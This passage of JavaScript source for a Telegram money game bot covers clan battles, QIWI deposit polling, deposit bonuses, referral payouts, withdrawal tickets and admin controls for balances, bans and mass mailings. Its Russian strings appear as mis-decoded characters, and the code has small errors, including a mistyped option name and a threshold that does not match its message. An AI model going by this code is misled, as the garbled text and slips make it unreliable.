üïí –ë–∏—Ç–≤–∞ ${config.teplica_six} –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç 5, 15 –∏ 25-–≥–æ —á–∏—Å–ª–∞ –∫–∞–∂–¥–æ–≥–æ –º–µ—Å—è—Ü–∞!
üèÜ ${config.teplica_three} -–ø–æ–±–µ–¥–∏—Ç–µ–ª—å –ø–æ–ª—É—á–∞–µ—Ç <b> 100k ${config.threetextthree}</b> –≤ —Å–≤–æ—é –∫–∞–∑–Ω—É
–ó–∞ 2 –º–µ—Å—Ç–æ - <b> 50k ${config.threetextthree}</b>
–ó–∞ 3 –º–µ—Å—Ç–æ - <b> 30k ${config.threetextthree}</b>
–ó–∞ 4 –º–µ—Å—Ç–æ - <b> 15k ${config.threetextthree}</b>
–ó–∞ 5 –º–µ—Å—Ç–æ - <b> 5k ${config.threetextthree}</b>

<b>–î–æ —Å–ª–µ–¥—É—é—â–µ–π –±–∏—Ç–≤—ã:</b> ${ost} –¥–Ω–µ–π
		
<b> –¢–û–ü ${config.teplica_six} —Ç–µ–∫—É—â–µ–π –±–∏—Ç–≤—ã </b>
		
1. ${clans[0].name} - ${clans[0].total_earn}  –≤ —á–∞—Å
2. ${clans[1].name} - ${clans[1].total_earn}  –≤ —á–∞—Å
3. ${clans[2].name} - ${clans[2].total_earn}  –≤ —á–∞—Å
4. ${clans[3].name} - ${clans[3].total_earn}  –≤ —á–∞—Å
5. ${clans[4].name} - ${clans[4].total_earn}  –≤ —á–∞—Å
`, { parse_mode: "html" });
		else
			return bot.sendMessage(message.chat.id, `<b>üèÜ –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ωo ${config.teplica_six} –¥–ª—è —Å–æ—Å—Ç–∞–≤–ª–µ–Ω–∏—è —Ç–æ–ø–∞</b>`, { parse_mode: "html" });
	}


	if (ADMINS.indexOf(query.from.id) !== -1) {
		if (d == "admin_mm") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏ –∏–ª–∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ:\n\n<i>–î–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –∫–Ω–æ–ø–∫–∏-—Å—Å—ã–ª–∫–∏ –≤ —Ä–∞—Å—Å—ã–ª–∞–µ–º–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–æ–±–∞–≤—å—Ç–µ –≤ –∫–æ–Ω–µ—Ü —Å–æ–æ–±—â–µ–Ω–∏—è —Å—Ç—Ä–æ–∫—É –≤–∏–¥–∞:</i>\n# –¢–µ–∫—Å—Ç –Ω–∞ –∫–Ω–æ–ø–∫–µ # http://t.me/link #', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7770
		} else if (d == "admin_w") {
			bot.deleteMessage(message.chat.id, message.message_id);
			let tickets = await Ticket.find();
			if (tickets.length == 0) return bot.sendMessage(uid, '–ó–∞—è–≤–æ–∫ –Ω–∞ –≤—ã–≤–æ–¥ –Ω–µ—Ç');
			await tickets.map((x) => {
				bot.sendMessage(uid, `üìù –ò–≥—Ä–æ–∫: <a href="tg://user?id=${x.id}">–ò–≥—Ä–æ–∫</a> (ID: <code>${x.id}</code>)\n
	üí∞ –°—É–º–º–∞: <code>${x.amount}</code>‚ÇΩ
	ü•ù –ö–æ—à–µ–ª—ë–∫: <code>${x.wallet}</code>`, {
					parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: 'üì≠ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤—ã–ø–ª–∞—Ç—É', callback_data: `withdraw:${x.id}` }], [{ text: '‚ôªÔ∏è –í–µ—Ä–Ω—É—Ç—å', callback_data: `back:${x.id}` }], [{ text: 'üö´ –ó–∞–±—Ä–∞—Ç—å', callback_data: `take:${x.id}` }]] }
				});
			});
		}
		else if (d == "admin_top") {
			bot.deleteMessage(message.chat.id, message.message_id);
			var u = await User.find({ ref: { $ne: 0 }, _id: { $gt: mongo.Types.ObjectId.createFromTime(Date.now() / 1000 - 24 * 60 * 60) } })
			console.log(u)
			var top = []
			u.map((e) => {
				var t = top.filter(u => { if (e.ref == u.id) return true; else return false })
				if (t.length == 0) top.push({ id: e.ref, ref: 1 })
				else {
					top = top.filter(u => { if (e.ref == u.id) return false; else return true })
					top.push({ id: e.ref, ref: t[0].ref + 1 })
				}
			})
			top = top.sort((a, b) => { if (a.ref <= b.ref) return 1; else return -1 })
			top.length = 20
			var str = `<b>üïí –¢–æ–ø —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤ –∑–∞ 24 —á–∞—Å–∞:</b>\n\n`
			for (const i in top) {
				var us = await User.findOne({ id: top[i].id })
				str += `<b>${Number(i) + 1})</b> <a href="tg://user?id=${us.id}">${us.name ? us.name : "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"}</a> - <b>${top[i].ref}</b> —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤\n`
			}
			bot.sendMessage(uid, str, { reply_markup: { inline_keyboard: [[{ text: "‚óÄÔ∏è –ù–∞–∑–∞–¥", callback_data: "admin_return" }]] }, parse_mode: "HTML" })
		}
		else if (d == "admin_b") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ % –¥–ª—è –±–æ–Ω—É—Å–∞ –∫ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—é –∏–ª–∏ 0 –¥–ª—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7771
		}

		else if (d == "admin_u") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7772
		}
		else if (d.split("_")[0] == "addBuyBal") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ –¥–ª—è –ø–æ–∫—É–ø–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7773
			data[uid] = d.split("_")[1]
		}
		else if (d.split("_")[0] == "addOutBal") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ –¥–ª—è –≤—ã–≤–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7774
			data[uid] = d.split("_")[1]
		}
		else if (d.split("_")[0] == "addPayIns") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 777455
			data[uid] = d.split("_")[1]
		}
		else if (d.split("_")[0] == "addPayOuts") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ —Å—É–º–º—É –≤—ã–≤–æ–¥–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 77745555
			data[uid] = d.split("_")[1]
		}
		else if (d.split("_")[0] == "editBuyBal") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –±–∞–ª–∞–Ω—Å –¥–ª—è –ø–æ–∫—É–ø–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7775
			data[uid] = d.split("_")[1]
		}
		else if (d.split("_")[0] == "editOutBal") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –±–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–≤–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7776
			data[uid] = d.split("_")[1]
		}
		else if (d.split("_")[0] == "editPayIns") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—É—é —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 777655
			data[uid] = d.split("_")[1]
		}
		else if (d.split("_")[0] == "editPayOuts") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—É—é —Å—É–º–º—É –≤—ã–≤–æ–¥–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 77765555
			data[uid] = d.split("_")[1]
		}
		else if (d.split("_")[0] == "giveTree") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, `–í—ã–±–µ—Ä–µ—Ç–µ ${config.pers} –¥–ª—è –≤—ã–¥–∞—á–∏:`, { reply_markup: { inline_keyboard: [[{ text: trees[0].name, callback_data: "giveTree2_" + d.split("_")[1] + "_0" }], [{ text: trees[1].name, callback_data: "giveTree2_" + d.split("_")[1] + "_1" }], [{ text: trees[2].name, callback_data: "giveTree2_" + d.split("_")[1] + "_2" }], [{ text: trees[3].name, callback_data: "giveTree2_" + d.split("_")[1] + "_3" }], [{ text: trees[4].name, callback_data: "giveTree2_" + d.split("_")[1] + "_4" }], [{ text: trees[5].name, callback_data: "giveTree2_" + d.split("_")[1] + "_5" }], [{ text: trees[6].name, callback_data: "giveTree2_" + d.split("_")[1] + "_6" }], [{ text: trees[7].name, callback_data: "giveTree2_" + d.split("_")[1] + "_7" }],  ] }, parse_mode: "HTML" })
		}

		else if (d.split("_")[0] == "giveTree2") {
			bot.deleteMessage(message.chat.id, message.message_id);
			giveTree(Number(d.split("_")[1]), Number(d.split("_")[2]))
			bot.sendMessage(Number(d.split("_")[1]), `–í–∞–º –≤—ã–¥–∞–Ω–æ ${config.pers}: ` + trees[Number(d.split("_")[2])].name, { rparse_mode: "HTML" })
			bot.sendMessage(uid, `${trees[Number(d.split("_")[2])].name} –≤—ã–¥–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é`, { reply_markup: RM_admin_return, parse_mode: "HTML" })
		}
		else if (d.split("_")[0] == "takeTree") {
			bot.deleteMessage(message.chat.id, message.message_id);
			var id = Number(d.split("_")[1])
			var u = await User.findOne({ id })
			var keyboard = { inline_keyboard: [] }
			for (var i = 0; i < u.trees.length; i++) {
				var tree = u.trees[i]
				console.log(tree)
				keyboard.inline_keyboard.push([{ text: trees.find((x) => x.id == tree.id).name, callback_data: "takeTree2_" + id + "_" + i }])
			}
			bot.sendMessage(uid, `–í—ã–±–µ—Ä–µ—Ç–µ ${config.pers}, –∫–æ—Ç–æ—Ä–æ–≥–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –æ—Ç–Ω—è—Ç—å:`, { reply_markup: keyboard, parse_mode: "HTML" })
		}
		else if (d.split("_")[0] == "takeTree2") {
			bot.deleteMessage(message.chat.id, message.message_id);
			var id = Number(d.split("_")[1])
			var i = Number(d.split("_")[2])
			var u = await User.findOne({ id })
			u.trees.splice(i, 1)
			await User.findOneAndUpdate({ id }, { trees: u.trees })
			bot.sendMessage(uid, `–í—ã —É—Å–ø–µ—à–Ω–æ –∑–∞–±—Ä–∞–ª–∏ ${config.pers} —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!`, { reply_markup: { inline_keyboard: [[{ text: "–ù–∞–∑–∞–¥", callback_data: "takeTree_" + id }]] }, parse_mode: "HTML" })
		}

		else if (d == "a_voucher") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, `–í—ã–±–µ—Ä–µ—Ç–µ ${config.pers} –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —á–µ–∫–∞:`, { reply_markup: { inline_keyboard: [[{ text: trees[0].name, callback_data: "voucher_0" }], [{ text: trees[1].name, callback_data: "voucher_1" }], [{ text: trees[2].name, callback_data: "voucher_2" }], [{ text: trees[3].name, callback_data: "voucher_3" }], [{ text: trees[4].name, callback_data: "voucher_4" }], [{ text: trees[5].name, callback_data: "voucher_5" }], [{ text: trees[6].name, callback_data: "voucher_6" }], [{ text: trees[7].name, callback_data: "voucher_7" }],   ] }, parse_mode: "HTML" })
		}
		else if (d.split("_")[0] == "voucher") {
			bot.deleteMessage(message.chat.id, message.message_id);
			var cid = generateID(8)
			await Voucher.insertMany({ id: cid, tree_id: Number(d.split("_")[1]) })
			bot.sendMessage(uid, `–ß–µ–∫ —Å–æ–∑–¥–∞–Ω:\nhttps://t.me/${config.bot}?start=C${cid}`, { reply_markup: RM_admin_return })
		}
		else if (d == "admin_mm_stop") {
			var tek = Math.round((mm_i / mm_total) * 40)
			var str = ""
			for (var i = 0; i < tek; i++) str += "+"
			str += '>'
			for (var i = tek + 1; i < 41; i++) str += "-"
			mm_status = false;
			bot.editMessageText("–†–∞—Å—Å—ã–ª–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞!", { chat_id: mm_achatid, message_id: mm_amsgid })
			mm_u = []
		}
		else if (d == "admin_mm_pause") {
			var tek = Math.round((mm_i / mm_total) * 40)
			var str = ""
			for (var i = 0; i < tek; i++) str += "+"
			str += '>'
			for (var i = tek + 1; i < 41; i++) str += "-"
			bot.editMessageText("<b>–í—ã–ø–æ–ª–Ω–µ–Ω–æ:</b> " + mm_i + '/' + mm_total + ' - ' + Math.round((mm_i / mm_total) * 100) + '%\n' + str + "\n\n<b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:</b>\n<b>–£—Å–ø–µ—à–Ω—ã—Ö:</b> " + mm_ok + "\n<b>–ù–µ—É—Å–ø–µ—à–Ω—ã—Ö:</b> " + mm_err, { chat_id: mm_achatid, message_id: mm_amsgid, reply_markup: RM_mm2, parse_mode: html })
			mm_status = false;
		}
		else if (d == "admin_mm_play") {
			mm_status = true;
			bot.editMessageText("–í—ã–ø–æ–ª–Ω–µ–Ω–æ: " + mm_i + '/' + mm_total + ' - ' + Math.round((mm_i / mm_total) * 100) + '%\n', { chat_id: mm_achatid, message_id: mm_amsgid, reply_markup: RM_mm1 })
		}
		else if (d.split("_")[0] == "ban") {
			var uuid = Number(d.split("_")[1])
			await User.findOneAndUpdate({ id: uuid }, { ban: true })
			bot.editMessageText('<a href="tg://user?id=' + uuid + '">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a> –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω!', { chat_id: uid, message_id: message.message_id, parse_mode: html })
		}
		else if (d.split("_")[0] == "unban") {
			var uuid = Number(d.split("_")[1])
			await User.findOneAndUpdate({ id: uuid }, { ban: false })
			bot.editMessageText('<a href="tg://user?id=' + uuid + '">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a> —Ä–∞–∑–±–∞–Ω–µ–Ω!', { chat_id: uid, message_id: message.message_id, parse_mode: html })
		}
		else if (d == "admin_return") {
			bot.deleteMessage(message.chat.id, message.message_id);
			var h = process.uptime() / 3600 ^ 0
			var m = (process.uptime() - h * 3600) / 60 ^ 0
			var s = process.uptime() - h * 3600 - m * 60 ^ 0
			var heap = process.memoryUsage().rss / 1048576 ^ 0
			var b = (await User.findOne({ id: 0 })).deposit
			return qiwi.getBalance(async (err, balance) => {
				bot.sendMessage(uid, '<b>–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å:</b>\n\n<b>–ê–ø—Ç–∞–π–º –±–æ—Ç–∞:</b> ' + h + ' —á–∞—Å–æ–≤ ' + m + ' –º–∏–Ω—É—Ç ' + s + ' —Å–µ–∫—É–Ω–¥\n<b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ –±–æ—Ç–µ: </b>' + (await User.countDocuments({})) + '\n<b>–ü–∞–º—è—Ç–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ:</b> ' + heap + "–ú–ë\n<b>–ó–∞—è–≤–æ–∫ –Ω–∞ –≤—ã–≤–æ–¥:</b> " + await Ticket.countDocuments() + "\n<b>–ë–∞–ª–∞–Ω—Å QIWI:</b> " + balance.accounts[0].balance.amount + "‚ÇΩ\n<b>–ë–æ–Ω—É—Å –∫ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—é:</b> " + b + "%", { parse_mode: "HTML", reply_markup: RM_admin })
			})
		}
	}
});

var state = []


User.prototype.inc = function (field, value = 1) {
	this[field] += value;
	return this.save();
}

User.prototype.dec = function (field, value = 1) {
	this[field] -= value;
	return this.save();
}

User.prototype.set = function (field, value) {
	this[field] = value;
	return this.save();
}

function getNavigationIcon(id, tree_id) {
	if (id == tree_id) return 'üîµ';
	else {
		if (id == 0) return '1Ô∏è‚É£';
		if (id == 1) return '2Ô∏è‚É£';
		if (id == 2) return '3Ô∏è‚É£';
		if (id == 3) return '4Ô∏è‚É£';
		if (id == 4) return '5Ô∏è‚É£';
		if (id == 5) return '6Ô∏è‚É£';
		if (id == 6) return '7Ô∏è‚É£';
		if (id == 7) return '8Ô∏è‚É£';
		if (id == 8) return '9Ô∏è‚É£';
	}
}

function getNavigationQuery(id, tree_id) {
	if (id == tree_id) return 'none';
	else {
		if (id == 0) return 'trees:shop0';
		if (id == 1) return 'trees:shop1';
		if (id == 2) return 'trees:shop2';
		if (id == 3) return 'trees:shop3';
		if (id == 4) return 'trees:shop4';
		if (id == 5) return 'trees:shop5';
		if (id == 6) return 'trees:shop6';
		if (id == 7) return 'trees:shop7';
		if (id == 8) return 'trees:shop8';
	}
}

function getInventoryIcon(id, tree_id) {
	if (id == tree_id) return 'üî¥';
	else {
		if (id == 0) return '1Ô∏è‚É£';
		if (id == 1) return '2Ô∏è‚É£';
		if (id == 2) return '3Ô∏è‚É£';
		if (id == 3) return '4Ô∏è‚É£';
		if (id == 4) return '5Ô∏è‚É£';
		if (id == 5) return '6Ô∏è‚É£';
		if (id == 6) return '7Ô∏è‚É£';
		if (id == 7) return '8Ô∏è‚É£';
		if (id == 8) return '9Ô∏è‚É£';
	}
}

function getInventoryQuery(id, tree_id) {
	if (id == tree_id) return 'none';
	else {
		if (id == 0) return 'trees:inv0';
		if (id == 1) return 'trees:inv1';
		if (id == 2) return 'trees:inv2';
		if (id == 3) return 'trees:inv3';
		if (id == 4) return 'trees:inv4';
		if (id == 5) return 'trees:inv5';
		if (id == 6) return 'trees:inv6';
		if (id == 7) return 'trees:inv7';
		if (id == 8) return 'trees:inv8';
	}
}

var lastTxnId

var state = []

setInterval(async () => {
	qiwi.getOperationHistory({ rows: 10, operation: 'IN' }, (err, response) => {
		response.data.map(async (x) => {
			if (!x.comment) return;
			if (txnId.indexOf(x.txnId) !== -1) return;
			if (x.comment.startsWith('BG')) {
				let id = Number(x.comment.split("BG")[1]);
				let user = await User.findOne({ id });
				if (!user) return;
				await user.inc('game_payin', x.sum.amount);
				await user.inc('game_balance', x.sum.amount);
				await bot.sendMessage(id, `üí≥ –í—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–ø–æ–ª–Ω–∏–ª–∏ —Å–≤–æ–π –∏–≥—Ä–æ–≤–æ–π –±–∞–ª–∞–Ω—Å –Ω–∞ ${x.sum.amount}‚ÇΩ`);
				bot.sendMessage(1093342102, ` <a href="tg://user?id=${id}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a> –ø–æ–ø–æ–ª–Ω–∏–ª –∏–≥—Ä–æ–≤–æ–π –±–∞–ª–∞–Ω—Å –Ω–∞ <b>${x.sum.amount}‚ÇΩ</b>`, { parse_mode: "HTML" })
				txnId.push(x.txnId)
				require('fs').writeFileSync('./txnId.json', JSON.stringify(txnId));
				return
			}
			let id = Number(x.comment.split("SM")[1]);
			if (!id) return;
			let user = await User.findOne({ id });
			if (!user) return;
			if (x.sum.currency != 643) return;
			var b = (await User.findOne({ id: 0 })).deposit / 100
			var sum = x.sum.amount
			if (b > 0) {
				await user.inc('deposit', x.sum.amount);
				if (user.deposit + x.sum.amount > 100 && !user.not) {
					await bot.sendMessage(id, `üí∞ –í—ã –ø–æ–ø–æ–ª–Ω–∏–ª–∏ –±–∞–ª–∞–Ω—Å –±–æ—Ç–∞ –±–æ–ª–µ–µ, —á–µ–º –Ω–∞ 100‚ÇΩ –∏ –ø—Ä–∏–≥–ª–∞—à–∞–µ—Ç–µ—Å—å –≤ —á–∞—Ç –∏–Ω–≤–µ—Å—Ç–æ—Ä–æ–≤!\n–ü–µ—Ä–µ—à–ª–∏—Ç–µ —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É @${config.admin}`);
					await User.findOneAndUpdate({ id: user.id }, { not: true })
				}

				await user.inc('buybalance', x.sum.amount + x.sum.amount * b);
				await User.findOneAndUpdate({ id: 0 }, { $inc: { ref: x.sum.amount } })
				bot.sendMessage(id, `–í–∞—à –±–∞–ª–∞–Ω—Å –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ ${x.sum.amount}‚ÇΩ –∏ –í—ã –ø–æ–ª—É—á–∞–µ—Ç–µ –±–æ–Ω—É—Å - ${roundPlus(x.sum.amount * b)}‚ÇΩ!`);
				bot.sendMessage(`@${config.deposit}`, ` <a href="tg://user?id=${id}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a> –ø–æ–ø–æ–ª–Ω–∏–ª –±–∞–ª–∞–Ω—Å –Ω–∞ <b>${x.sum.amount}‚ÇΩ</b> –∏ –ø–æ–ª—É—á–∏–ª ${roundPlus(x.sum.amount * b)}‚ÇΩ –±–æ–Ω—É—Å–æ–º!\n–ü–°: QIWI`, { parse_mode: "HTML" })
				ADMINS.map((a) => bot.sendMessage(a, `<a href="tg://user?id=${id}">–ò–≥—Ä–æ–∫</a> —Å–¥–µ–ª–∞–ª –¥–µ–ø–æ–∑–∏—Ç: ${x.sum.amount}‚ÇΩ + ${roundPlus(x.sum.amount * b)}‚ÇΩ –±–æ–Ω—É—Å\n–ü–°: QIWI`, { parse_mode: "HTML" }))

			}
			else if (b == 0) {
				await user.inc('deposit', x.sum.amount);
				if (user.deposit + x.sum.amount > 100 && !user.not) {
					await bot.sendMessage(id, `üí∞ –í—ã –ø–æ–ø–æ–ª–Ω–∏–ª–∏ –±–∞–ª–∞–Ω—Å –±–æ—Ç–∞ –±–æ–ª–µ–µ, —á–µ–º –Ω–∞ 100‚ÇΩ –∏ –ø—Ä–∏–≥–ª–∞—à–∞–µ—Ç–µ—Å—å –≤ —á–∞—Ç –∏–Ω–≤–µ—Å—Ç–æ—Ä–æ–≤!\n–ü–µ—Ä–µ—à–ª–∏—Ç–µ —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É @${config.admin}`);
					await User.findOneAndUpdate({ id: user.id }, { not: true })
				}
				await user.inc('buybalance', x.sum.amount);
				await User.findOneAndUpdate({ id: 0 }, { $inc: { ref: x.sum.amount } })
				bot.sendMessage(id, `–í–∞—à –±–∞–ª–∞–Ω—Å –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ ${x.sum.amount}‚ÇΩ`);
				bot.sendMessage(`@${config.deposit}`, ` <a href="tg://user?id=${id}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a> –ø–æ–ø–æ–ª–Ω–∏–ª –±–∞–ª–∞–Ω—Å –Ω–∞ <b>${x.sum.amount}‚ÇΩ</b>\n–ü–°: QIWI`, { parse_mode: "HTML" })
				ADMINS.map((a) => bot.sendMessage(a, `<a href="tg://user?id=${id}">–ò–≥—Ä–æ–∫</a> —Å–¥–µ–ª–∞–ª –¥–µ–ø–æ–∑–∏—Ç: ${x.sum.amount}‚ÇΩ\n–ü–°: QIWI`, { parse_mode: "HTML" }))
			} else {
				await user.inc('deposit', x.sum.amount);
				if (user.deposit + x.sum.amount > 1000 && !user.not) {
					await bot.sendMessage(id, `üí∞ –í—ã –ø–æ–ø–æ–ª–Ω–∏–ª–∏ –±–∞–ª–∞–Ω—Å –±–æ—Ç–∞ –±–æ–ª–µ–µ, —á–µ–º –Ω–∞ 100‚ÇΩ –∏ –ø—Ä–∏–≥–ª–∞—à–∞–µ—Ç–µ—Å—å –≤ —á–∞—Ç –∏–Ω–≤–µ—Å—Ç–æ—Ä–æ–≤!\n–ü–µ—Ä–µ—à–ª–∏—Ç–µ —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É @${config.admin}`);
					await User.findOneAndUpdate({ id: user.id }, { not: true })
				}
				b = b / 100
				await user.inc('buybalance', x.sum.amount + x.sum.amount * b);
				await User.findOneAndUpdate({ id: 0 }, { $inc: { ref: x.sum.amount } })
				bot.sendMessage(id, `–í–∞—à –±–∞–ª–∞–Ω—Å –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ ${x.sum.amount}‚ÇΩ –∏ –í—ã –ø–æ–ª—É—á–∞–µ—Ç–µ –±–æ–Ω—É—Å - ${roundPlus(x.sum.amount * b)}‚ÇΩ!`);
				bot.sendMessage(`@${config.deposit}`, ` <a href="tg://user?id=${id}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a> –ø–æ–ø–æ–ª–Ω–∏–ª –±–∞–ª–∞–Ω—Å –Ω–∞ <b>${x.sum.amount}‚ÇΩ</b> –∏ –ø–æ–ª—É—á–∏–ª ${roundPlus(x.sum.amount * b)}‚ÇΩ –±–æ–Ω—É—Å–æ–º!\n–ü–°: QIWI`, { parse_mode: "HTML" })
				ADMINS.map((a) => bot.sendMessage(a, `<a href="tg://user?id=${id}">–ò–≥—Ä–æ–∫</a> —Å–¥–µ–ª–∞–ª –¥–µ–ø–æ–∑–∏—Ç: ${x.sum.amount}‚ÇΩ + ${roundPlus(x.sum.amount * b)}‚ÇΩ –±–æ–Ω—É—Å`, { parse_mode: "HTML" }))

			}
			await User.findOneAndUpdate({ id: user.ref }, { $inc: { buybalance: roundPlus(x.sum.amount * 0.05) } })
			await User.findOneAndUpdate({ id: user.ref }, { $inc: { outbalance: roundPlus(x.sum.amount * 0.05) } })

			bot.sendMessage(user.ref, `ü§ù –í–∞—à <a href="tg://user?id=${id}">—Ä–µ—Ñ–µ—Ä–∞–ª</a> –ø–æ–ø–æ–ª–Ω–∏–ª –±–∞–ª–∞–Ω—Å –Ω–∞ <b>${x.sum.amount}‚ÇΩ</b>!\nüí∏ –í–∞–º –Ω–∞—á–∏—Å–ª–µ–Ω–æ –ø–æ <b>${roundPlus(x.sum.amount * 0.05)}‚ÇΩ</b> –Ω–∞ –±–∞–ª–∞–Ω—Å—ã –¥–ª—è –ø–æ–∫—É–ø–æ–∫ –∏ –¥–ª—è –≤—ã–≤–æ–¥–∞`, { parse_mode: "HTML" }).catch()

			txnId.push(x.txnId)
			require('fs').writeFileSync('./txnId.json', JSON.stringify(txnId));
		});
	});
}, 10000);

async function mmTick() {
	if (mm_status) {
		try {
			mm_i++
			if (mm_type == "text") {
				if (mm_btn_status)
					bot.sendMessage(mm_u[mm_i - 1], mm_text, { reply_markup: { inline_keyboard: [[{ text: mm_btn_text, url: mm_btn_link }]] }, parse_mode: html }).then((err) => { mm_ok++ }).catch((err) => { mm_err++ })
				else
					bot.sendMessage(mm_u[mm_i - 1], mm_text, { parse_mode: html }).then((err) => { console.log((mm_i - 1) + ') ID ' + mm_u[mm_i - 1] + " OK"); mm_ok++ }).catch((err) => { mm_err++ })
			}
			else if (mm_type == "img") {
				if (mm_btn_status)
					bot.sendPhoto(mm_u[mm_i - 1], mm_imgid, { caption: mm_text, reply_markup: { inline_keyboard: [[{ text: mm_btn_text, url: mm_btn_link }]] } }).then((err) => { mm_ok++ }).catch((err) => { mm_err++ })
				else
					bot.sendPhoto(mm_u[mm_i - 1], mm_imgid, { caption: mm_text }).then((err) => { console.log((mm_i - 1) + ') ID ' + mm_u[mm_i - 1] + " OK"); mm_ok++ }).catch((err) => { mm_err++ })
			}
			if (mm_i % 10 == 0) {
